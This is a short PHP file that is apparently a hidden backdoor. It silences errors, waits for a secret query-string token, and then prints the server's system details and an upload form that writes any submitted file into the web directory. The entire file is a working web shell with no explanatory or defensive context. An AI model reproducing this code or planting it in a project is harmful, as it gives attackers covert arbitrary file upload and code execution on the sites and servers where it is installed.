<?php
error_reporting(0); 
if ($_GET['noncexwx'] == '1805437635636248932571'){
    echo 'TFX1337<br>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
} 
?>
